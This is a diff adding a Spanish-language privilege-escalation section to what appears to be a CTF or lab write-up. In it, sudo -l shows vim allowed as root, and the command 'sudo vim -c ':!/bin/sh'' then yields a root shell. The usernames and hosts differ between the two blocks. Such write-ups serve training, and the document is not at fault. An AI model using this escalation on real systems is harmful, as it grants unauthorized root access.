@@ -124,4 +124,28 @@ mario
 
 # Escalada de privilegios
 
-Haciendo una investigación a nivel local del sistema ...
+Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo` y vemos que podemos ejecutar el binario **vim**.
+
+```
+mario@91a9d6272033:~$ sudo -l
+[sudo] password for mario:
+Matching Defaults entries for mario on 91a9d6272033:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User mario may run the following commands on 91a9d6272033:
+    (ALL) /usr/bin/vim
+```
+
+Si investigamos en la página web de [GTFOBINS](https://gtfobins.github.io/) vemos como podemos conseguir una shell con permisos sudo.
+
+![](../../../Images/Pasted%20image%2020241008162323.png)
+
+```
+russoski@7646d085583b:~$ sudo /usr/bin/vim -c ':!/bin/sh'
+
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+```
